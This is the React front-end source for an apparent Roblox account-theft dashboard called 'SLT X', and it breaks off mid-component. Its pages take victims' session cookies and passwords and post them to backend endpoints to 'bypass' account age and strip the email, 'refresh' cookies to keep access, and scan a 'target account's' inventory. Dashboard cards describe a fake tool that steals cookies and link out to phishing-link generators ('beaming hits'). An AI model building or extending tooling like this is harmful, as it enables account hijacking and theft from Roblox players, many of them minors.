import React, { useState, useEffect } from 'react';
import {
  BrowserRouter,
  Routes,
  Route,
  Link,
  useNavigate,
  useLocation,
  Navigate
} from 'react-router-dom';
import {
  LayoutDashboard,
  ShieldCheck,
  RefreshCw,
  UserSearch,
  BookOpen,
  Lock,
  MessageSquare,
  Activity,
  Globe,
  Link as LinkIcon,
  ChevronRight,
  X,
  Menu,
  CheckCircle2,
  XCircle,
  Eye,
  EyeOff,
  Copy,
  ChevronDown,
  ChevronUp,
  Loader2
} from 'lucide-react';

// --- Components ---

function Layout({ children, sidebarOpen, setSidebarOpen, isMobile }: any) {
  const location = useLocation();

  const activeTab = () => {
    const path = location.pathname;
    if (path === '/') return 'Dashboard';
    if (path === '/bypass') return 'Bypasser';
    if (path === '/refresh') return 'Refresher';
    if (path === '/checker') return 'Account Checker';
    if (path === '/tutorials') return 'Tutorials';
    if (path === '/admin') return 'Admin Panel';
    return '';
  };

  return (
    <div className="flex h-screen bg-[#0a0a0a] text-white font-sans overflow-hidden">
      
      {/* Mobile Overlay */}
      {isMobile && sidebarOpen && (
        <div 
          className="fixed inset-0 bg-black/60 z-40 transition-opacity"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* Sidebar */}
      <aside 
        className={`
          ${isMobile 
            ? `fixed inset-y-0 left-0 z-50 w-64 transform transition-transform duration-300 ease-in-out ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}`
            : `relative z-20 flex flex-col transition-all duration-300 ease-in-out ${sidebarOpen ? 'w-64' : 'w-0'}`
          }
          border-r border-[#1f1f1f] bg-[#0a0a0a]
        `}
      >
        <div className="p-6 flex items-center justify-between overflow-hidden whitespace-nowrap h-[80px]">
           <div className="text-2xl font-bold italic tracking-wider">SLT X Dashboard</div>
           {isMobile && (
             <button onClick={() => setSidebarOpen(false)} className="text-gray-400 hover:text-white">
               <X size={20} />
             </button>
           )}
        </div>

        <nav className="flex-1 px-4 space-y-1 overflow-y-auto overflow-x-hidden whitespace-nowrap pb-4">
          <NavItem to="/" icon={<LayoutDashboard size={20} />} label="Dashboard" active={activeTab() === 'Dashboard'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/bypass" icon={<ShieldCheck size={20} />} label="Bypasser" active={activeTab() === 'Bypasser'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/refresh" icon={<RefreshCw size={20} />} label="Refresher" active={activeTab() === 'Refresher'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/checker" icon={<UserSearch size={20} />} label="Account Checker" active={activeTab() === 'Account Checker'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="/tutorials" icon={<BookOpen size={20} />} label="Tutorials" active={activeTab() === 'Tutorials'} onClick={() => isMobile && setSidebarOpen(false)} />

          <div className="my-4 border-t border-[#1f1f1f]"></div>

          <NavItem to="/admin" icon={<Lock size={20} />} label="Admin Panel" active={activeTab() === 'Admin Panel'} onClick={() => isMobile && setSidebarOpen(false)} />
          <NavItem to="#" icon={<MessageSquare size={20} />} label="Discord Community" active={false} onClick={() => { window.open('https://discord.gg/qZePjjmb7k', '_blank'); if (isMobile) setSidebarOpen(false); }} />
        </nav>

        {/* Desktop Collapse button */}
        {!isMobile && (
          <button 
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="absolute -right-3 top-1/2 transform -translate-y-1/2 bg-[#1f1f1f] border border-[#2a2a2a] rounded-2xl p-1 text-gray-400 hover:text-white z-30"
          >
            {sidebarOpen ? <X size={14} /> : <Menu size={14} />}
          </button>
        )}
      </aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col h-screen overflow-hidden relative z-10 w-full">
        
        {/* Mobile Header */}
        {isMobile && (
          <div className="flex items-center justify-between p-4 border-b border-[#1f1f1f] bg-[#0a0a0a] shrink-0 h-[80px]">
            <div className="text-xl font-bold italic tracking-wider">SLT X</div>
            <button onClick={() => setSidebarOpen(true)} className="text-gray-400 hover:text-white p-2 -mr-2">
              <Menu size={24} />
            </button>
          </div>
        )}

        <div className="flex-1 overflow-y-auto p-4 sm:p-6 md:p-8 lg:p-12">
          {children}
        </div>
      </main>
    </div>
  );
}

function NavItem({ to, icon, label, active = false, onClick }: { to: string, icon: React.ReactNode, label: string, active?: boolean, onClick?: () => void }) {
  if (to === '#') {
    return (
      <button
        onClick={onClick}
        className={`w-full flex items-center gap-3 px-4 py-3 rounded-2xl transition-colors ${
          active ? 'bg-[#1f1f1f] text-white' : 'text-gray-400 hover:text-white hover:bg-[#141414]'
        }`}
      >
        {icon}
        <span className="font-medium text-sm">{label}</span>
      </button>
    );
  }
  
  return (
    <Link
      to={to}
      onClick={onClick}
      className={`w-full flex items-center gap-3 px-4 py-3 rounded-2xl transition-colors ${
        active ? 'bg-[#1f1f1f] text-white' : 'text-gray-400 hover:text-white hover:bg-[#141414]'
      }`}
    >
      {icon}
      <span className="font-medium text-sm">{label}</span>
    </Link>
  );
}

function StatItem({ icon, label, value }: { icon: React.ReactNode, label: string, value: string }) {
  return (
    <div className="p-5 md:p-6 border border-[#1f1f1f] rounded-2xl bg-[#0a0a0a] flex flex-col">
      <div className="text-gray-400 mb-3 md:mb-4">
        <div className="p-2 border border-[#1f1f1f] inline-block rounded-2xl bg-[#0a0a0a]">
            {icon}
        </div>
      </div>
      <div>
        <p className="text-gray-400 text-xs md:text-sm mb-1">{label}</p>
        <p className="text-xl md:text-2xl font-bold">{value}</p>
      </div>
    </div>
  );
}

function ToolCard({ icon, title, subtitle, description, children, onClick }: { icon: React.ReactNode, title: string, subtitle: string, description: string, children?: React.ReactNode, onClick?: () => void }) {
  return (
    <div className="border border-[#1f1f1f] bg-[#0a0a0a] p-5 md:p-6 flex flex-col h-full min-h-[220px] md:min-h-[250px] rounded-2xl">
      <div className="flex justify-between items-start mb-4">
        <div className="flex items-center gap-3">
          <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
            {icon}
          </div>
          <div>
            <h3 className="font-bold text-base md:text-lg leading-tight">{title}</h3>
            <p className="text-[9px] md:text-[10px] text-gray-400 tracking-wider font-semibold uppercase">{subtitle}</p>
          </div>
        </div>
        <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0 ml-2">
          <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
          <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white">ONLINE</span>
        </div>
      </div>
      
      <p className="text-gray-400 text-xs md:text-sm mb-6 flex-1 leading-relaxed">
        {description}
      </p>

      <div className="mt-auto flex flex-col gap-3">
        {children}
        {onClick && (
          <button 
            onClick={onClick}
            className="w-full bg-white text-black font-bold py-2 md:py-2.5 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base"
          >
            Launch Session <ChevronRight size={16} />
          </button>
        )}
      </div>
    </div>
  );
}

function TutorialCard({ id, icon, title, subtitle, colorClass, iconBgClass, isExpanded, onClick, children }: any) {
  return (
    <div className={`rounded-3xl border overflow-hidden transition-all duration-200 ${colorClass}`}>
      <button 
        onClick={onClick}
        className="w-full flex items-center justify-between p-4 md:p-5 text-left"
      >
        <div className="flex items-center gap-4">
          <div className={`p-3 rounded-2xl ${iconBgClass}`}>
            {icon}
          </div>
          <div>
            <h3 className="font-bold text-white text-base md:text-lg">{title}</h3>
            <p className="text-xs md:text-sm text-gray-400 mt-0.5">{subtitle}</p>
          </div>
        </div>
        <div className="text-gray-500 pr-2">
          {isExpanded ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
        </div>
      </button>
      
      {isExpanded && (
        <div className="px-5 pb-5 pt-2 border-t border-white/5">
          {children}
        </div>
      )}
    </div>
  );
}

// --- Pages ---

function Dashboard({ backendStats }: any) {
  const navigate = useNavigate();
  
  return (
    <>
      <header className="mb-6 md:mb-8">
        <h1 className="text-2xl md:text-3xl font-bold mb-1">Dashboard</h1>
        <p className="text-gray-400 text-sm">SLT X Dashboard</p>
      </header>

      {/* Stats Row */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 mb-6 md:mb-8">
        <StatItem 
          icon={<Activity size={20} />} 
          label="Total Bypasses" 
          value={backendStats.totalBypasses.toString()} 
        />
        <StatItem 
          icon={<UserSearch size={20} />} 
          label="Accounts Checked" 
          value={backendStats.totalChecks.toString()} 
        />
        <StatItem 
          icon={<RefreshCw size={20} />} 
          label="Cookies Refreshed" 
          value={backendStats.totalRefreshes.toString()} 
        />
      </div>

      {/* Tools Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 md:gap-6">
        <ToolCard
          icon={<ShieldCheck size={24} />}
          title="Bypasser"
          subtitle="ROBLOX BYPASSER"
          description="a roblox bypasser Forces Roblox accounts age from 13+ to 13- which removes the email."
          onClick={() => navigate('/bypass')}
        />

        <ToolCard
          icon={<Activity size={24} />}
          title="Autohar"
          subtitle="AUTOMATED HAR"
          description="a autohar is a fake Roblox tools they can steal your Roblox cookie."
          onClick={() => window.open('https://bloxtools.net/page/login/21c86853', '_blank')}
        />

        <ToolCard
          icon={<UserSearch size={24} />}
          title="Account Checker"
          subtitle="DEEP SCANNER"
          description="account checker is that checks your whole inventory just using cookie"
          onClick={() => navigate('/checker')}
        />

        <ToolCard
          icon={<Globe size={24} />}
          title="Generator"
          subtitle="LINK GENERATOR"
          description="creating fake links to get hits/beaming hits"
        >
          <div className="flex flex-col gap-2">
            <button 
              onClick={() => window.open('https://www.logged.tg/auth/klux4', '_blank')}
              className="w-full bg-white text-black font-bold py-2 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm"
            >
              Main Site <Globe size={14} />
            </button>
            <button 
              onClick={() => window.open('https://app.beamse.pro/gen/esp', '_blank')}
              className="w-full bg-[#141414] border border-[#1f1f1f] text-white font-bold py-2 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-[#1f1f1f] transition-colors text-sm"
            >
              Backup Site <RefreshCw size={14} />
            </button>
          </div>
        </ToolCard>

        <ToolCard
          icon={<LinkIcon size={24} />}
          title="Hyperlink"
          subtitle="EXTERNAL TOOL"
          description="Access the advanced Hyperlink session manager for enhanced connectivity and control."
          onClick={() => window.open('https://silentx-hyperlink.vercel.app/', '_blank')}
        />
      </div>
    </>
  );
}

function Bypasser({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState<any>(null);
  const [copiedBypass, setCopiedBypass] = useState(false);

  const handleBypass = async () => {
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    const isValid = cookie.startsWith(ROBLOX_WARNING) && cookie.length > 150;

    if (!isValid) {
      setResponse({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
      return;
    }

    setLoading(true);
    setResponse(null);
    try {
      const res = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cook: cookie, password }),
      });
      const data = await res.json();
      const formattedData = data.result ? data : { result: data };
      setResponse(formattedData);
      
      if (formattedData.result?.success) {
        setBackendStats((prev: any) => ({ 
          ...prev, 
          totalBypasses: prev.totalBypasses + 1,
          lastRefreshTime: new Date().toISOString() 
        }));
      }
    } catch (error) {
      setResponse({ error: 'Failed to execute bypass' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center w-full">
      <header className="mb-6 md:mb-8 text-center">
        <h1 className="text-2xl md:text-3xl font-bold mb-1">Bypasser</h1>
        <p className="text-gray-400 text-sm">Force Roblox accounts age from 13+ to 13-</p>
      </header>

      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
              <ShieldCheck size={24} />
            </div>
            <div>
              <h3 className="font-bold text-lg md:text-xl leading-tight">Roblox Bypasser</h3>
              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">ACTIVE SESSION</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
          </div>
        </div>

        <div className="space-y-6">
          <div>
            <div className="flex justify-between items-center mb-2">
              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
              {cookie.length > 0 && (
                <span className={`text-[10px] font-bold uppercase tracking-wider ${cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
                  {cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
                </span>
              )}
            </div>
            <div className="relative">
              <input 
                type="text" 
                value={cookie}
                onChange={(e) => setCookie(e.target.value)}
                placeholder="Enter Cookie..." 
                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${cookie.length > 0 ? (cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && cookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
              />
              {cookie.length > 0 && (
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(cookie);
                    setCopiedBypass(true);
                    setTimeout(() => setCopiedBypass(false), 2000);
                  }}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                  title="Copy input to clipboard"
                >
                  {copiedBypass ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
                </button>
              )}
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">Password</label>
            <div className="relative">
              <input 
                type={showPassword ? "text" : "password"} 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter Password (optional)..." 
                className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-gray-400 transition-colors"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          <button 
            onClick={handleBypass}
            disabled={loading || !cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || cookie.length <= 150}
            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(loading || !cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || cookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
          >
            {loading ? (
              <><Loader2 size={16} className="animate-spin" /> Processing...</>
            ) : (
              <>Execute Bypass <ChevronRight size={16} /></>
            )}
          </button>

          {response && (
            <div className={`mt-6 p-5 rounded-2xl border flex gap-4 items-start transition-all duration-300 ${
              response.result?.success 
                ? 'bg-green-500/10 border-green-500/20 text-green-200' 
                : 'bg-red-500/10 border-red-500/20 text-red-200'
            }`}>
              <div className={`shrink-0 mt-0.5 ${response.result?.success ? 'text-green-500' : 'text-red-500'}`}>
                {response.result?.success ? <CheckCircle2 size={24} /> : <XCircle size={24} />}
              </div>
              <div className="flex-1">
                <h4 className="font-bold text-lg mb-1 text-white">
                  {response.result?.success ? 'Bypass Successful!' : 'Bypass Failed!'}
                </h4>
                <p className="text-sm text-gray-400 leading-relaxed">
                  {response.result?.message || response.message || response.error}
                </p>
                
                {response.result?.success && response.result?.content && (
                  <div className="mt-4">
                    <label className="block text-[10px] font-bold uppercase tracking-wider text-gray-500 mb-1">Bypassed Cookie</label>
                    <div className="relative group">
                      <textarea 
                        readOnly
                        value={response.result.content}
                        className="w-full bg-[#0a0a0a] border border-green-500/20 rounded-2xl p-3 text-xs font-mono text-green-400 h-24 resize-none focus:outline-none"
                      />
                      <button 
                        onClick={() => {
                          navigator.clipboard.writeText(response.result.content);
                          setCopiedBypass(true);
                          setTimeout(() => setCopiedBypass(false), 2000);
                        }}
                        className="absolute top-2 right-2 p-1.5 bg-green-500/20 hover:bg-green-500/40 text-green-400 rounded-2xl transition-colors flex items-center gap-1"
                      >
                        {copiedBypass ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function Refresher({ setBackendStats }: any) {
  const [refresherCookie, setRefresherCookie] = useState('');
  const [refresherLoading, setRefresherLoading] = useState(false);
  const [refresherResponse, setRefresherResponse] = useState<any>(null);
  const [copiedRefresh, setCopiedRefresh] = useState(false);

  const handleRefresh = async () => {
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    const isValid = refresherCookie.startsWith(ROBLOX_WARNING) && refresherCookie.length > 150;

    if (!isValid) {
      setRefresherResponse({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
      return;
    }

    setRefresherLoading(true);
    setRefresherResponse(null);
    try {
      const res = await fetch('/api/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: refresherCookie }),
      });
      const data = await res.json();
      const formattedData = data.result ? data : { result: data };
      setRefresherResponse(formattedData);
      
      if (formattedData.result?.success) {
        setBackendStats((prev: any) => ({ 
          ...prev, 
          totalRefreshes: prev.totalRefreshes + 1,
          lastRefreshTime: new Date().toISOString() 
        }));
      }
    } catch (error) {
      setRefresherResponse({ error: 'Failed to execute refresh' });
    } finally {
      setRefresherLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center w-full">
      <header className="mb-6 md:mb-8 text-center">
        <h1 className="text-2xl md:text-3xl font-bold mb-1">Refresher</h1>
        <p className="text-gray-400 text-sm">Refresh Roblox account cookies to maintain access.</p>
      </header>

      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
              <RefreshCw size={24} />
            </div>
            <div>
              <h3 className="font-bold text-lg md:text-xl leading-tight">Roblox Refresher</h3>
              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">MAINTENANCE TOOL</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
          </div>
        </div>

        <div className="space-y-6">
          <div>
            <div className="flex justify-between items-center mb-2">
              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
              {refresherCookie.length > 0 && (
                <span className={`text-[10px] font-bold uppercase tracking-wider ${refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
                  {refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
                </span>
              )}
            </div>
            <div className="relative">
              <input 
                type="text" 
                value={refresherCookie}
                onChange={(e) => setRefresherCookie(e.target.value)}
                placeholder="Enter Cookie to refresh..." 
                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${refresherCookie.length > 0 ? (refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && refresherCookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
              />
              {refresherCookie.length > 0 && (
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(refresherCookie);
                    setCopiedRefresh(true);
                    setTimeout(() => setCopiedRefresh(false), 2000);
                  }}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                  title="Copy input to clipboard"
                >
                  {copiedRefresh ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
                </button>
              )}
            </div>
          </div>

          <button 
            onClick={handleRefresh}
            disabled={refresherLoading || !refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || refresherCookie.length <= 150}
            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(refresherLoading || !refresherCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || refresherCookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
          >
            {refresherLoading ? (
              <><Loader2 size={16} className="animate-spin" /> Processing...</>
            ) : (
              <>Execute Refresh <ChevronRight size={16} /></>
            )}
          </button>

          {refresherResponse && (
            <div className={`mt-6 p-4 border rounded-2xl flex gap-4 ${
              refresherResponse.result?.success 
                ? 'bg-green-500/10 border-green-500/20 text-green-200' 
                : 'bg-red-500/10 border-red-500/20 text-red-200'
            }`}>
              <div className={`shrink-0 mt-0.5 ${refresherResponse.result?.success ? 'text-green-500' : 'text-red-500'}`}>
                {refresherResponse.result?.success ? <CheckCircle2 size={24} /> : <XCircle size={24} />}
              </div>
              <div className="flex-1">
                <h4 className="font-bold text-lg mb-1 text-white">
                  {refresherResponse.result?.success ? 'Refresh Successful!' : 'Refresh Failed!'}
                </h4>
                <p className="text-sm text-gray-400 leading-relaxed">
                  {refresherResponse.result?.message || refresherResponse.message || refresherResponse.error}
                </p>
                
                {refresherResponse.result?.success && refresherResponse.result?.content && (
                  <div className="mt-4">
                    <label className="block text-[10px] font-bold uppercase tracking-wider text-gray-500 mb-1">New Refreshed Cookie</label>
                    <div className="relative group">
                      <textarea 
                        readOnly
                        value={refresherResponse.result.content}
                        className="w-full bg-[#0a0a0a] border border-green-500/20 rounded-2xl p-3 text-xs font-mono text-green-400 h-24 resize-none focus:outline-none"
                      />
                      <button 
                        onClick={() => {
                          navigator.clipboard.writeText(refresherResponse.result.content);
                          setCopiedRefresh(true);
                          setTimeout(() => setCopiedRefresh(false), 2000);
                        }}
                        className="absolute top-2 right-2 p-1.5 bg-green-500/20 hover:bg-green-500/40 text-green-400 rounded-2xl transition-colors flex items-center gap-1"
                      >
                        {copiedRefresh ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function AccountChecker({ setBackendStats }: any) {
  const [checkerCookie, setCheckerCookie] = useState('');
  const [checkerLoading, setCheckerLoading] = useState(false);
  const [checkerResponse, setCheckerResponse] = useState<any>(null);
  const [copiedChecker, setCopiedChecker] = useState(false);

  const handleChecker = async () => {
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    const isValid = checkerCookie.startsWith(ROBLOX_WARNING) && checkerCookie.length > 150;

    if (!isValid) {
      setCheckerResponse({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
      return;
    }

    setCheckerLoading(true);
    setCheckerResponse(null);
    try {
      const res = await fetch("/api/check", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: checkerCookie })
      });
      const data = await res.json();
      const formattedData = data.result ? data : { result: data };
      setCheckerResponse(formattedData);
      
      if (formattedData.result?.status === 'success') {
        setBackendStats((prev: any) => ({ ...prev, totalChecks: prev.totalChecks + 1 }));
      }
    } catch (error) {
      setCheckerResponse({ error: "Failed to connect to the server." });
    } finally {
      setCheckerLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center w-full">
      <header className="mb-6 md:mb-8 text-center">
        <h1 className="text-2xl md:text-3xl font-bold mb-1">Account Checker</h1>
        <p className="text-gray-400 text-sm">Deep scan Roblox accounts using their session cookie.</p>
      </header>

      <div className="w-full max-w-2xl border border-[#1f1f1f] bg-[#0a0a0a] p-6 md:p-8 rounded-2xl">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <div className="p-2 border border-[#1f1f1f] rounded-2xl text-gray-300 bg-[#0a0a0a]">
              <UserSearch size={24} />
            </div>
            <div>
              <h3 className="font-bold text-lg md:text-xl leading-tight">Account Checker</h3>
              <p className="text-[10px] text-gray-400 tracking-wider font-semibold uppercase">DEEP SCANNER</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 bg-[#141414] px-2 py-1 rounded-2xl border border-[#1f1f1f] shrink-0">
            <div className="w-1.5 h-1.5 bg-white rounded-2xl"></div>
            <span className="text-[8px] md:text-[9px] font-bold tracking-wider text-white uppercase">System Online</span>
          </div>
        </div>

        <div className="space-y-6">
          <div>
            <div className="flex justify-between items-center mb-2">
              <label className="block text-sm font-medium text-gray-400">Roblox Cookie</label>
              {checkerCookie.length > 0 && (
                <span className={`text-[10px] font-bold uppercase tracking-wider ${checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'text-green-500' : 'text-red-500'}`}>
                  {checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'Valid Format' : 'Invalid Format'}
                </span>
              )}
            </div>
            <div className="relative">
              <input 
                type="text" 
                value={checkerCookie}
                onChange={(e) => setCheckerCookie(e.target.value)}
                placeholder="Enter Cookie to scan..." 
                className={`w-full bg-[#141414] border rounded-2xl px-4 py-3 pr-12 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors ${checkerCookie.length > 0 ? (checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") && checkerCookie.length > 150 ? 'border-green-500/50' : 'border-red-500/50') : 'border-[#1f1f1f] focus:border-gray-400'}`}
              />
              {checkerCookie.length > 0 && (
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(checkerCookie);
                    setCopiedChecker(true);
                    setTimeout(() => setCopiedChecker(false), 2000);
                  }}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                  title="Copy input to clipboard"
                >
                  {copiedChecker ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} />}
                </button>
              )}
            </div>
            <p className="text-xs text-gray-500 mt-2">Enter the target account's cookie to scan its inventory and details. <span className="text-gray-400 font-semibold italic">Note: The cookie must contain the standard Roblox warning message.</span></p>
          </div>

          <button 
            onClick={handleChecker}
            disabled={checkerLoading || !checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || checkerCookie.length <= 150}
            className={`w-full bg-white text-black font-bold py-3 px-4 rounded-2xl flex items-center justify-center gap-2 hover:bg-gray-200 transition-colors text-sm md:text-base ${(checkerLoading || !checkerCookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") || checkerCookie.length <= 150) ? 'opacity-50 cursor-not-allowed' : ''}`}
          >
            {checkerLoading ? (
              <><Loader2 size={16} className="animate-spin" /> Processing...</>
            ) : (
              <>Execute Scan <ChevronRight size={16} /></>
            )}
          </button>

          {checkerResponse && (
            <div className={`mt-6 p-4 border rounded-2xl ${
              checkerResponse.result?.status === 'success'
                ? 'bg-green-500/10 border-green-500/20 text-green-200' 
                : 'bg-red-500/10 border-red-500/20 text-red-200'
            }`}>
              <div className="flex gap-4 mb-4">
                <div className={`shrink-0 mt-0.5 ${checkerResponse.result?.status === 'success' ? 'text-green-500' : 'text-red-500'}`}>
